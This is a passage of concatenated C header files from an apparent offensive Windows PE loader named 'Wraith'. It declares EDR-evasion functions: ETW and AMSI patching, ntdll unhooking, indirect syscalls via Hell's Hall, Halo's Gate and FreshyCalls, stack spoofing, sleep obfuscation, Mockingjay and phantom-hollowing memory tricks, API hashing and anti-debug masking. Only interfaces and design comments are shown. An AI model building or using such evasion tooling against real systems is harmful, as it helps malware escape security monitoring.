 * Get a pointer to the resource bytes. The pointer aliases into the
 * loaded image; do NOT free or modify it.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_load_resource_data(wraith_handle_t h, wraith_resource_t r,
  const void **out_data);

/* -------------------------------------------------------------------------
 * Load a string from STRINGTABLE by ID. `out_buffer` is wchar_t (UTF-16
 * little-endian as per Windows convention). `buf_chars` is the buffer
 * size in wchar_t units, and `out_chars` (optional, may be NULL) receives
 * the actual length copied (excluding the terminator).
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_load_string(wraith_handle_t h, uint32_t id,
  uint16_t language,
  wchar_t *out_buffer, size_t buf_chars,
  size_t *out_chars);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_RESOURCE_H */


/* ==========================================================================
 * include/wraith/wraith_stealth.h
 * ========================================================================== */

/*
 * include/wraith/wraith_stealth.h
 *
 * Opt-in stealth-control surface. Each entry point is conditionally
 * compiled based on the corresponding WRAITH_USE_* macro - if a feature was
 * compiled out, calling the corresponding API returns
 * WRAITH_E_FEATURE_DISABLED.
 *
 * The intent is that consumers with `paranoid-full` builds can drive the
 * stealth state machine explicitly; the default profile keeps these
 * symbols out of the binary entirely.
 */

#ifndef WRAITH_STEALTH_H
#define WRAITH_STEALTH_H


#ifdef __cplusplus
extern "C" {
#endif

/* -------------------------------------------------------------------------
 * Sleep obfuscation - request that the loaded image be encrypted in place
 * and the calling thread blocked for `duration_ms`. When WRAITH_F_THREADLESS_EXEC
 * is also set, the awakener runs from a hijacked thread-pool callback.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_sleep(wraith_handle_t h, uint32_t duration_ms);

/* -------------------------------------------------------------------------
 * Trigger a one-shot "encrypt now / decrypt on demand" cycle for the
 * Page-Guard tier . Useful when the consumer wants to mark idle
 * windows shorter than a regular sleep would justify.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_pageguard_arm(wraith_handle_t h);
wraith_status_t wraith_pageguard_disarm(wraith_handle_t h);

/* -------------------------------------------------------------------------
 * Hardware-breakpoint hooks . Install/remove a DR-based redirect from
 * `target_fn` to `replacement_fn` for the calling thread only.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_hwbp_install(void *target_fn, void *replacement_fn,
  int dr_index /* 0..3, -1 = auto */);
wraith_status_t wraith_hwbp_remove(int dr_index);

/* -------------------------------------------------------------------------
 * Stack spoofing - returns WRAITH_OK if the synthetic-frame engine
 * has a curated gadget table for the current OS build, otherwise
 * WRAITH_E_STEALTH_INCOMPATIBLE (caller should disable WRAITH_F_STACK_SPOOF).
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_stackspoof_probe(void);

/* -------------------------------------------------------------------------
 * Userland unhooking - either via legacy disk-refresh (WRAITH_USE_UNHOOK_NTDLL)
 * or via Private ntdll (WRAITH_USE_PRIVATE_NTDLL). The flag set on
 * wraith_load_options picks which mechanism is used.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_unhook_ntdll(void);

/* -------------------------------------------------------------------------
 * ETW / AMSI patches. Idempotent. Not undone by wraith_free_library - they
 * affect the host process for its remaining lifetime.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_patch_etw(void);
wraith_status_t wraith_patch_amsi(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_STEALTH_H */


/* ==========================================================================
 * internal headers (inlined)
 * ========================================================================== */


/* ==========================================================================
 * src/core/wr_ptr_check.h
 * ========================================================================== */

/*
 * src/core/wr_ptr_check.h
 *
 * Pointer-validation primitives shared across the loader. The whole
 * codebase enforces a single rule: any pointer that came out of an
 * OS call (LoadLibraryA, NtCreateSection + MapView, PEB walk, hash
 * resolver, GetModuleHandle...) MUST pass `wr_looks_like_valid_base`
 * before being used as a base for `dos->`, `nt->`, `base + rva`,
 * etc.
 *
 * Rationale: under EDR-hooked Windows 11 24H2, several OS calls have
 * been observed returning STATUS_SUCCESS with NULL or near-NULL
 * pointers (handle = 0x6, base = 0x9). Without this guard, the
 * loader faults on `mov reg, [ptr+small]` instructions inside member
 * accesses, producing crashes at FaultAddress = small_offset that
 * are extremely hard to attribute back to the originating OS call.
 */

#ifndef WRAITH_PTR_CHECK_H
#define WRAITH_PTR_CHECK_H

#include <stddef.h>
#include <stdint.h>

/* Lowest user-mode page on Win10/11 x64. NtAllocateVirtualMemory and
 * the loader never hand out memory below this; any pointer that's
 * below is either NULL, a stomped value, or a small handle that some
 * caller forgot to cast. */
#define WRAITH_USER_LOW_GUARD  ((uintptr_t)0x10000)

static inline int wr_looks_like_valid_base(const void *p)
{
    return p != NULL && (uintptr_t)p >= WRAITH_USER_LOW_GUARD;
}

#endif  /* WRAITH_PTR_CHECK_H */


/* ==========================================================================
 * src/pe/pe_constants.h
 * ========================================================================== */

/*
 * src/pe/pe_constants.h
 *
 * Self-contained PE constants used by the parser. We do NOT pull in
 * <windows.h> here because the parser is meant to be portable and
 * fuzzable on Linux/macOS without an SDK. Windows-specific consumers
 * still get full IMAGE_* names through their own includes.
 *
 * All field offsets and sizes were cross-checked against:
 *  - Microsoft "PE Format" docs (winmd revision 2024-02)
 *  - <winnt.h> from Windows 10 SDK 10.0.22621
 *  - MinGW-w64 headers (winnt.h)
 */

#ifndef WRAITH_PE_CONSTANTS_H
#define WRAITH_PE_CONSTANTS_H

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* DOS / NT magic */
#define WRAITH_PE_DOS_SIGNATURE  0x5A4D  /* 'MZ' */
#define WRAITH_PE_NT_SIGNATURE  0x00004550  /* 'PE\0\0' */
#define WRAITH_PE_OPT_MAGIC_PE32  0x010B
#define WRAITH_PE_OPT_MAGIC_PE32PLUS  0x020B

/* IMAGE_FILE_MACHINE_* (FileHeader.Machine) */
#define WRAITH_PE_MACHINE_AMD64  0x8664
#define WRAITH_PE_MACHINE_I386  0x014c
#define WRAITH_PE_MACHINE_ARM64  0xAA64

/* IMAGE_FILE_HEADER.Characteristics */
#define WRAITH_PE_FILE_DLL  0x2000
#define WRAITH_PE_FILE_EXECUTABLE  0x0002

/* IMAGE_DIRECTORY_ENTRY_* indices into OptionalHeader.DataDirectory[] */
#define WRAITH_PE_DIR_EXPORT  0
#define WRAITH_PE_DIR_IMPORT  1
#define WRAITH_PE_DIR_RESOURCE  2
#define WRAITH_PE_DIR_EXCEPTION  3
#define WRAITH_PE_DIR_SECURITY  4
#define WRAITH_PE_DIR_BASERELOC  5
#define WRAITH_PE_DIR_DEBUG  6
#define WRAITH_PE_DIR_TLS  9
#define WRAITH_PE_DIR_LOAD_CONFIG  10
#define WRAITH_PE_DIR_BOUND_IMPORT  11
#define WRAITH_PE_DIR_IAT  12
#define WRAITH_PE_DIR_DELAY_IMPORT  13
#define WRAITH_PE_DIR_COM_DESCRIPTOR  14
#define WRAITH_PE_DIR_COUNT  16

/* Section characteristics (subset relevant to the loader) */
#define WRAITH_PE_SCN_CNT_CODE  0x00000020
#define WRAITH_PE_SCN_CNT_INITIALIZED_DATA  0x00000040
#define WRAITH_PE_SCN_CNT_UNINITIALIZED  0x00000080
#define WRAITH_PE_SCN_MEM_DISCARDABLE  0x02000000
#define WRAITH_PE_SCN_MEM_NOT_CACHED  0x04000000
#define WRAITH_PE_SCN_MEM_NOT_PAGED  0x08000000
#define WRAITH_PE_SCN_MEM_SHARED  0x10000000
#define WRAITH_PE_SCN_MEM_EXECUTE  0x20000000
#define WRAITH_PE_SCN_MEM_READ  0x40000000
#define WRAITH_PE_SCN_MEM_WRITE  0x80000000

/* Relocation types we accept (x64 only). HIGHLOW is x86 - rejected. */
#define WRAITH_PE_REL_ABSOLUTE  0
#define WRAITH_PE_REL_HIGHLOW  3  /* x86 only - rejected */
#define WRAITH_PE_REL_DIR64  10  /* x64 - the only one we honor */

/* IMAGE_SIZEOF_SHORT_NAME */
#define WRAITH_PE_SECTION_NAME_LEN  8

/* IMAGE_BASE_RELOCATION header size (matches sizeof(IMAGE_BASE_RELOCATION)) */
#define WRAITH_PE_RELOC_HDR_SIZE  8

#pragma pack(push, 1)

typedef struct wr_pe_dos_header {
  uint16_t e_magic;  /* 'MZ' */
  uint16_t e_cblp;
  uint16_t e_cp;
  uint16_t e_crlc;
  uint16_t e_cparhdr;
  uint16_t e_minalloc;
  uint16_t e_maxalloc;
  uint16_t e_ss;
  uint16_t e_sp;
  uint16_t e_csum;
  uint16_t e_ip;
  uint16_t e_cs;
  uint16_t e_lfarlc;
  uint16_t e_ovno;
  uint16_t e_res[4];
  uint16_t e_oemid;
  uint16_t e_oeminfo;
  uint16_t e_res2[10];
  uint32_t e_lfanew;  /* file offset to NT headers */
} wr_pe_dos_header;

typedef struct wr_pe_file_header {
  uint16_t Machine;
  uint16_t NumberOfSections;
  uint32_t TimeDateStamp;
  uint32_t PointerToSymbolTable;
  uint32_t NumberOfSymbols;
  uint16_t SizeOfOptionalHeader;
  uint16_t Characteristics;
} wr_pe_file_header;

typedef struct wr_pe_data_directory {
  uint32_t VirtualAddress;
  uint32_t Size;
} wr_pe_data_directory;

/* PE32+ (64-bit) optional header. We don't model PE32 (x86) - x64 only. */
typedef struct wr_pe_optional_header64 {
  uint16_t Magic;
  uint8_t  MajorLinkerVersion;
  uint8_t  MinorLinkerVersion;
  uint32_t SizeOfCode;
  uint32_t SizeOfInitializedData;
  uint32_t SizeOfUninitializedData;
  uint32_t AddressOfEntryPoint;
  uint32_t BaseOfCode;
  uint64_t ImageBase;
  uint32_t SectionAlignment;
  uint32_t FileAlignment;
  uint16_t MajorOperatingSystemVersion;
  uint16_t MinorOperatingSystemVersion;
  uint16_t MajorImageVersion;
  uint16_t MinorImageVersion;
  uint16_t MajorSubsystemVersion;
  uint16_t MinorSubsystemVersion;
  uint32_t Win32VersionValue;
  uint32_t SizeOfImage;
  uint32_t SizeOfHeaders;
  uint32_t CheckSum;
  uint16_t Subsystem;
  uint16_t DllCharacteristics;
  uint64_t SizeOfStackReserve;
  uint64_t SizeOfStackCommit;
  uint64_t SizeOfHeapReserve;
  uint64_t SizeOfHeapCommit;
  uint32_t LoaderFlags;
  uint32_t NumberOfRvaAndSizes;
  wr_pe_data_directory DataDirectory[WRAITH_PE_DIR_COUNT];
} wr_pe_optional_header64;

typedef struct wr_pe_nt_headers64 {
  uint32_t  Signature;
  wr_pe_file_header  FileHeader;
  wr_pe_optional_header64  OptionalHeader;
} wr_pe_nt_headers64;

typedef struct wr_pe_section_header {
  uint8_t  Name[WRAITH_PE_SECTION_NAME_LEN];
  uint32_t VirtualSize;
  uint32_t VirtualAddress;
  uint32_t SizeOfRawData;
  uint32_t PointerToRawData;
  uint32_t PointerToRelocations;
  uint32_t PointerToLinenumbers;
  uint16_t NumberOfRelocations;
  uint16_t NumberOfLinenumbers;
  uint32_t Characteristics;
} wr_pe_section_header;

typedef struct wr_pe_base_relocation {
  uint32_t VirtualAddress;
  uint32_t SizeOfBlock;
  /* uint16_t TypeOffset[]; */
} wr_pe_base_relocation;

#pragma pack(pop)

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PE_CONSTANTS_H */


/* ==========================================================================
 * src/syscalls/sc_table.h
 * ========================================================================== */

/*
 * src/syscalls/sc_table.h
 *
 * Catalogue of Nt* syscalls the engine knows about. Adding a new
 * syscall is a 3-step change:
 *  1. Append it to WRAITH_SC_LIST below.
 *  2. Add the corresponding `wr_sc_<name>` stub to sc_trampoline_x64.S.
 *  3. Add the typed wrapper signature to sc_engine.h.
 *
 * The list also drives sc_ssn_resolver.c (one resolution per entry) and
 * sc_engine.c initialization.
 */

#ifndef WRAITH_SC_TABLE_H
#define WRAITH_SC_TABLE_H

#ifdef __cplusplus
extern "C" {
#endif

/*
 * X(name, hash) - "name" matches the ntdll export and the asm symbol
 * suffix (wr_sc_<name>, ssn_<name>); "hash" is the case-insensitive
 * DJB2 of "name", precomputed via tools/hashgen.py and inlined here so
 * the engine can resolve without depending on the generated header at
 * build time.
 */
#define WRAITH_SC_LIST(X) \
  X(NtAllocateVirtualMemory,  0xc66d2fccu) \
  X(NtProtectVirtualMemory,  0x191ec748u) \
  X(NtFreeVirtualMemory,  0xf429f469u) \
  X(NtFlushInstructionCache,  0x31532f5fu) \
  X(NtCreateSection,  0xc444a130u) \
  X(NtMapViewOfSection,  0x873f020au) \
  X(NtUnmapViewOfSection,  0xbbb10d4du) \
  X(NtClose,  0x2d18bb7du)

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_SC_TABLE_H */


/* ==========================================================================
 * src/stealth/hashing/hash_djb2.h
 * ========================================================================== */

/*
 * src/stealth/hashing/hash_djb2.h
 *
 * Case-insensitive DJB2 hash. Used by:
 *  - rt_pebwalk : hashing UNICODE_STRING base names of loaded modules
 *  - rt_resolver: hashing ASCII export names from a PE
 *  - tools/hashgen.py : compile-time pre-computed constants
 *
 * Definition (matches the Python generator):
 *  h0 = 5381
 *  h_n = (h_{n-1} * 33 + lower(c_n))
 *  final = h_n & 0xFFFFFFFF
 *
 * Lower-casing is restricted to the ASCII range A..Z so the hash remains
 * stable across locales. UTF-16 names are folded the same way.
 */

#ifndef WRAITH_HASH_DJB2_H
#define WRAITH_HASH_DJB2_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

uint32_t wr_djb2_a(const char *s);
uint32_t wr_djb2_a_n(const char *s, size_t n);
uint32_t wr_djb2_w(const wchar_t *s);
uint32_t wr_djb2_w_n(const wchar_t *s, size_t n);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_HASH_DJB2_H */


/* ==========================================================================
 * src/pe/pe_validate.h
 * ========================================================================== */

/*
 * src/pe/pe_validate.h
 *
 * Header bounds validation. The validator is the FIRST thing the loader
 * runs - everything downstream (section copy, relocations, imports) trusts
 * that the buffer's headers are well-formed.
 *
 * Design notes:
 *  - All checks are pure (no allocation, no syscalls). Runs identically
 *  in unit tests on Linux and inside a Windows process.
 *  - Returns rich wraith_status_t for every failure mode so fuzzers can
 *  classify crash inputs.
 *  - Robust against integer overflow (e_lfanew + sizeof(NT_HEADERS),
 *  section.PointerToRawData + section.SizeOfRawData, etc).
 */

#ifndef WRAITH_PE_VALIDATE_H
#define WRAITH_PE_VALIDATE_H


#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Output of a successful validation. The pointers alias into the caller's
 * buffer - no copies are made. Lifetime equals the buffer's lifetime. */
typedef struct wr_pe_view {
  const uint8_t  *buffer;
  size_t  buffer_size;
  const wr_pe_dos_header  *dos;
  const wr_pe_nt_headers64  *nt;
  const wr_pe_section_header  *sections;  /* array of NumberOfSections */
  uint16_t  section_count;
  int  is_dll;
  int  is_executable;
} wr_pe_view;

/* Validate `buffer` and produce an `wr_pe_view`. The view is only valid
 * while `buffer` is alive. */
wraith_status_t wr_pe_validate(const void *buffer, size_t buffer_size,
  wr_pe_view *out);

/* Convenience: get a single data directory entry (returns ABSENT-like via
 * out_size==0 when the directory is empty). */
wraith_status_t wr_pe_get_data_directory(const wr_pe_view *view,
  unsigned index,
  uint32_t *out_rva,
  uint32_t *out_size);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_PE_VALIDATE_H */


/* ==========================================================================
 * src/syscalls/sc_engine.h
 * ========================================================================== */

/*
 * src/syscalls/sc_engine.h
 *
 * Hell's Hall indirect syscall engine. Public surface used by the
 * runtime layer when WRAITH_F_INDIRECT_SYSCALLS is requested.
 *
 * Initialization model:
 *  wr_sc_engine_init walks ntdll once, populates SSN slots from
 *  the prologue of each Nt* export, and locates a `syscall; ret`
 *  gadget. After this call, the typed wrappers (wr_sc_call_*) route
 *  through the asm trampoline and never touch the standard ntdll
 *  prologue again - so any inline hooks placed at Nt* entry points
 *  are skipped.
 *
 *  When the resolver fails (e.g. wine, anti-tamper hardening) the
 *  engine falls back to direct function pointers, also resolved via
 *  the PEB walker. Callers always succeed at the API level; the
 *  stealth quality silently degrades.
 */

#ifndef WRAITH_SC_ENGINE_H
#define WRAITH_SC_ENGINE_H


#include <windows.h>
#include <winternl.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Engine state: resolved? are stubs functional or fallback? */
typedef enum wr_sc_mode {
  WRAITH_SC_MODE_UNINITIALIZED = 0,
  WRAITH_SC_MODE_HELLS_HALL  = 1,  /* asm stub + gadget path  */
  WRAITH_SC_MODE_FALLBACK  = 2  /* direct function pointer */
} wr_sc_mode;

wr_sc_mode wr_sc_engine_mode(void);

/* Initialize. Idempotent. Safe to call from multiple threads (init is
 * serialized). Returns WRAITH_OK in both HELLS_HALL and FALLBACK modes -
 * only NULL ntdll or grossly corrupt headers cause an error. */
wraith_status_t wr_sc_engine_init(void);

/* ------------------------------------------------------------------------
 * Diagnostic introspection.
 *
 * Used to confirm that the engine resolved sane values when a downstream
 * call (e.g. NtCreateSection) returns an unexpected NTSTATUS. When the
 * Hell's Hall and FreshyCalls SSNs disagree for any function, the
 * engine has been fooled by a hooked prologue and should be considered
 * unsafe in HELLS_HALL mode for that thread.
 * ------------------------------------------------------------------------ */
typedef struct wr_sc_engine_info {
    int       mode;                      /* wr_sc_mode value */
    int       gadget_valid;              /* 1 if g_gadget passes range check */
    void     *gadget;
    void     *ret_gadget;
    /* SSNs as resolved by the live engine (Hell's Hall + Halo's Gate). */
    uint32_t  hh_ssn[8];
    /* SSNs as computed independently by FreshyCalls (RVA-sort, immune
     * to inline hooks). Zero if computation failed (e.g. ntdll not
     * accessible). Compare element-wise against hh_ssn to detect
     * tier-1 corruption. */
    uint32_t  fc_ssn[8];
    /* Parallel name table for the eight slots above. */
    const char *names[8];
} wr_sc_engine_info;

/* Populate `out` with the engine's current state plus an independent
 * FreshyCalls computation for cross-checking. Safe to call after
 * wr_sc_engine_init. Returns WRAITH_OK even when fc_ssn entries are
 * zero (FreshyCalls failed). */
wraith_status_t wr_sc_engine_inspect(wr_sc_engine_info *out);

/* Diagnostic override: force the dispatcher to use the direct ntdll
 * function pointers (FALLBACK mode) regardless of what the engine
 * resolved. Takes effect on the next syscall on any thread - no
 * re-init required.
 *
 *   enable = 1: force FALLBACK (skip asm stubs entirely)
 *   enable = 0: restore the engine's normal mode selection
 *
 * Use case: when an Nt* call returns an unexpected NTSTATUS (e.g.
 * STATUS_INVALID_PAGE_PROTECTION on NtCreateSection that should
 * succeed), call this with enable=1, retry the operation, and check
 * whether the NTSTATUS changes. Different NTSTATUS = SSN was wrong.
 * Same NTSTATUS = parameter / environmental issue. */
void wr_sc_engine_force_fallback(int enable);

/* Typed wrappers. They internally pick stub vs fallback based on
 * engine mode; callers don't need to think about it. */

NTSTATUS wr_sc_call_NtAllocateVirtualMemory(
  HANDLE  process,
  PVOID  *base,
  ULONG_PTR zero_bits,
  PSIZE_T  region_size,
  ULONG  allocation_type,
  ULONG  protect);

NTSTATUS wr_sc_call_NtProtectVirtualMemory(
  HANDLE  process,
  PVOID  *base,
  PSIZE_T  region_size,
  ULONG  new_protect,
  PULONG  old_protect);

NTSTATUS wr_sc_call_NtFreeVirtualMemory(
  HANDLE  process,
  PVOID  *base,
  PSIZE_T  region_size,
  ULONG  free_type);

NTSTATUS wr_sc_call_NtFlushInstructionCache(
  HANDLE  process,
  PVOID  base,
  SIZE_T  size);

NTSTATUS wr_sc_call_NtCreateSection(
  PHANDLE  out_section,
  ULONG  desired_access,
  PVOID  object_attributes,  /* POBJECT_ATTRIBUTES; may be NULL */
  PLARGE_INTEGER max_size,
  ULONG  page_protection,
  ULONG  allocation_attribs,  /* SEC_IMAGE for phantom hollowing */
  HANDLE  file_handle);

NTSTATUS wr_sc_call_NtMapViewOfSection(
  HANDLE  section,
  HANDLE  process,
  PVOID  *base,
  ULONG_PTR zero_bits,
  SIZE_T  commit_size,
  PLARGE_INTEGER section_offset,
  PSIZE_T  view_size,
  DWORD  inherit_disposition,  /* enum */
  ULONG  allocation_type,
  ULONG  win32_protect);

NTSTATUS wr_sc_call_NtUnmapViewOfSection(
  HANDLE  process,
  PVOID  base);

NTSTATUS wr_sc_call_NtClose(HANDLE handle);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_SC_ENGINE_H */


/* ==========================================================================
 * src/syscalls/sc_gadget_finder.h
 * ========================================================================== */

/*
 * src/syscalls/sc_gadget_finder.h
 */

#ifndef WRAITH_SC_GADGET_FINDER_H
#define WRAITH_SC_GADGET_FINDER_H

#ifdef __cplusplus
extern "C" {
#endif

/* Locate a `syscall; ret` (0f 05 c3) gadget inside ntdll's .text.
 * Returns S_OK on success and writes the address to *out_gadget.
 * Returns WRAITH_E_SC_NO_GADGET when none is found (e.g. under wine64,
 * which doesn't ship that exact byte sequence in user-mode ntdll). */
wraith_status_t wr_sc_find_syscall_gadget(void *ntdll_base, void **out_gadget);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_SC_GADGET_FINDER_H */


/* ==========================================================================
 * src/syscalls/sc_ssn_resolver.h
 * ========================================================================== */

/*
 * src/syscalls/sc_ssn_resolver.h
 */

#ifndef WRAITH_SC_SSN_RESOLVER_H
#define WRAITH_SC_SSN_RESOLVER_H

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Try to resolve `name`'s SSN inside `ntdll_base` (already located via
 * PEB walk). On success writes the SSN to *out_ssn and returns S_OK.
 * On failure returns WRAITH_E_SC_SSN_NOT_RESOLVED.
 *
 * Resolution strategy (3-tier fallback chain):
 *  1. Hell's Hall: locate "Nt<name>" and match the canonical
 *  prologue pattern `4c 8b d1 b8 XX XX 00 00`. Extract SSN
 *  from bytes 4..5.
 *  2. Halo's Gate: if the prologue is JMP-hooked, scan +/- 32
 *  neighbour exports for an intact prologue and derive the
 *  target SSN by index distance (the kernel assigns SSNs in
 *  ascending RVA order).
 *  3. FreshyCalls : sort all "Nt"-prefixed exports by RVA
 *  and look up `name`'s position in the sorted list - that
 *  index IS the SSN. Survives the case where ALL Nt* are
 *  hooked (Halo's Gate fails) since it doesn't read prologue
 *  bytes at all. */
wraith_status_t wr_sc_resolve_ssn(void *ntdll_base, const char *name,
  uint32_t *out_ssn);

/* FreshyCalls-only entrypoint: build a sorted-by-RVA index of
 * "Nt"-prefixed exports and return `name`'s position in it.
 * Exposed publicly so tests can validate that FreshyCalls matches
 * the prologue-based result. */
wraith_status_t wr_sc_resolve_ssn_by_rva(void *ntdll_base, const char *name,
  uint32_t *out_ssn);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_SC_SSN_RESOLVER_H */


/* ==========================================================================
 * src/mapping/map_mockingjay_scanner.h
 * ========================================================================== */

/*
 * src/mapping/map_mockingjay_scanner.h
 *
 * Walk PEB.Ldr modules and find a contiguous `MEM_IMAGE + RWX`
 * region big enough for a payload. Some signed DLLs (msys-2.0,
 * specific MSI helper DLLs, certain SDK shims) ship with their
 * `.text` section marked `PAGE_EXECUTE_READWRITE` rather than
 * `PAGE_EXECUTE_READ`; reusing those skirts the "new RWX page"
 * IOC entirely.
 */

#ifndef WRAITH_MAP_MOCKINGJAY_SCANNER_H
#define WRAITH_MAP_MOCKINGJAY_SCANNER_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

wraith_status_t wr_mockingjay_find_region(size_t needed_bytes,
  void **out_base,
  size_t *out_size);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_MAP_MOCKINGJAY_SCANNER_H */


/* ==========================================================================
 * src/mapping/map_phantom_host_picker.h
 * ========================================================================== */

/*
 * src/mapping/map_phantom_host_picker.h
 *
 * Selects a Microsoft-signed DLL from System32 large enough to host a
 * payload of `payload_size` bytes when mapped via SEC_IMAGE.
 */

#ifndef WRAITH_MAP_PHANTOM_HOST_PICKER_H
#define WRAITH_MAP_PHANTOM_HOST_PICKER_H

#include <stddef.h>
#include <wchar.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Find a host DLL at least `payload_size` bytes long.
 *
 * `out_path` receives a NUL-terminated full Windows path. `cap` is the
 * buffer length in wchar_t units (recommended: 260).
 *
 * On success returns S_OK and writes the path. The caller may also
 * pass a non-NULL `preferred` to test a specific candidate first
 * (used by tests). */
wraith_status_t wr_phantom_pick_host(size_t payload_size,
  const wchar_t *preferred,
  wchar_t *out_path, size_t cap);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_MAP_PHANTOM_HOST_PICKER_H */


/* ==========================================================================
 * src/runtime/rt_pebwalk.h
 * ========================================================================== */

/*
 * src/runtime/rt_pebwalk.h
 *
 * Walks PEB.Ldr.InMemoryOrderModuleList to locate a loaded module by
 * its (case-insensitive) DJB2 base-name hash. Used as the GetModuleHandle
 * replacement when WRAITH_F_API_HASHING is requested.
 */

#ifndef WRAITH_RT_PEBWALK_H
#define WRAITH_RT_PEBWALK_H

#include <stddef.h>
#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Returns base address of the module whose BaseDllName hashes to
 * `name_hash`. Returns WRAITH_E_RT_PEB_WALK_FAILED if not found.
 *
 * The function never enters loader-lock and never calls into ntdll's
 * loader APIs - it just dereferences the PEB.Ldr lists. */
wraith_status_t wr_pebwalk_find_module(uint32_t name_hash, void **out_base);

/* Convenience: ASCII variant - hashes the name internally. */
wraith_status_t wr_pebwalk_find_module_a(const char *name, void **out_base);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_RT_PEBWALK_H */


/* ==========================================================================
 * src/runtime/rt_resolver.h
 * ========================================================================== */

/*
 * src/runtime/rt_resolver.h
 *
 * Walk a loaded module's IMAGE_EXPORT_DIRECTORY by hash, returning the
 * function address. The companion to rt_pebwalk: GetModuleHandle is
 * replaced by wr_pebwalk_find_module, GetProcAddress by
 * wr_resolver_lookup.
 *
 * Forwarder strings are resolved transparently - if the resolved RVA
 * points back into the export directory, the function follows the
 * "DLL.Func" reference via PEB walk and a recursive lookup.
 */

#ifndef WRAITH_RT_RESOLVER_H
#define WRAITH_RT_RESOLVER_H

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Resolve a function in `module_base` whose ASCII name hashes to
 * `name_hash`. Returns WRAITH_E_RT_API_NOT_RESOLVED on miss. */
wraith_status_t wr_resolver_lookup(void *module_base, uint32_t name_hash,
  void **out_proc);

/* Convenience: hashes the ASCII name internally. */
wraith_status_t wr_resolver_lookup_a(void *module_base, const char *name,
  void **out_proc);

/* Resolve by export ordinal. Follows forwarders identically to the
 * by-name path - including ordinal-form forwarders ("DLL.#NNN"). */
wraith_status_t wr_resolver_lookup_ordinal(void *module_base, uint16_t ordinal,
                                           void **out_proc);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_RT_RESOLVER_H */


/* ==========================================================================
 * src/stealth/amsi/amsi_patch.h
 * ========================================================================== */

/*
 * src/stealth/amsi/amsi_patch.h
 *
 * Hot-patch amsi.dll!AmsiScanBuffer. Relevant only for processes
 * that load .NET / PowerShell / JScript runtimes that submit
 * buffers to AMSI before execution. Native PE loading does not
 * invoke AMSI.
 */

#ifndef WRAITH_AMSI_PATCH_H
#define WRAITH_AMSI_PATCH_H

#ifdef __cplusplus
extern "C" {
#endif

/* Loads amsi.dll via LoadLibraryW if it is not already present in
 * the process; that's why the function is gated behind explicit
 * WRAITH_F_AMSI_PATCH (forces the user to opt in to amsi.dll being
 * brought into the process). Idempotent. */
wraith_status_t wr_amsi_patch_install(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_AMSI_PATCH_H */


/* ==========================================================================
 * src/stealth/anti_debug/anti_debug.h
 * ========================================================================== */

/*
 * src/stealth/anti_debug/anti_debug.h
 *
 * passive anti-debug masking. Zeroes the PEB flags that
 * generic anti-debug checks consult. Does NOT block a connected
 * debugger; it just hides the signals that reveal one.
 */

#ifndef WRAITH_ANTI_DEBUG_H
#define WRAITH_ANTI_DEBUG_H

#ifdef __cplusplus
extern "C" {
#endif

/* Idempotent. Returns S_OK in all reasonable configurations. */
wraith_status_t wr_anti_debug_spoof_install(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_ANTI_DEBUG_H */


/* ==========================================================================
 * src/stealth/etw/etw_patch.h
 * ========================================================================== */

/*
 * src/stealth/etw/etw_patch.h
 *
 * Hot-patch ntdll!EtwEventWrite so it returns ERROR_SUCCESS without
 * forwarding the event into the ETW dispatcher. Silences userland
 * ETW telemetry (the channel most EDR products consume in user
 * mode); does NOT silence ETW-Ti, which is dispatched in kernel
 * space and therefore unaffected by user-mode bytes.
 */

#ifndef WRAITH_ETW_PATCH_H
#define WRAITH_ETW_PATCH_H

#ifdef __cplusplus
extern "C" {
#endif

/* Idempotent. Safe to call multiple times. Returns WRAITH_OK if the
 * patch was already in place. */
wraith_status_t wr_etw_patch_install(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_ETW_PATCH_H */


/* ==========================================================================
 * src/stealth/heap_masq/heap_masq.h
 * ========================================================================== */

/*
 * src/stealth/heap_masq/heap_masq.h
 *
 * Heap masquerade. Allocates a private Wraith-owned heap distinct
 * from the process default heap so heap walks don't correlate the
 * loader's bookkeeping allocations with the consumer process's
 * `GetProcessHeap()` activity during a load.
 *
 * Baseline: a private process heap created on first use.
 * A future variant could root the heap segment inside a legit
 * MEM_IMAGE region so a heap-walker attributes the allocs to the
 * host module - that requires private knowledge of the ntdll heap
 * manager internals and is intentionally out of scope here.
 */

#ifndef WRAITH_HEAP_MASQ_H
#define WRAITH_HEAP_MASQ_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

void  *wr_heap_masq_alloc(size_t bytes);
void  wr_heap_masq_free(void *p);
void  wr_heap_masq_release(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_HEAP_MASQ_H */


/* ==========================================================================
 * src/stealth/host_iat/host_iat.h
 * ========================================================================== */

/*
 * src/stealth/host_iat/host_iat.h
 *
 * patch the host process's IAT entries so calls to a named
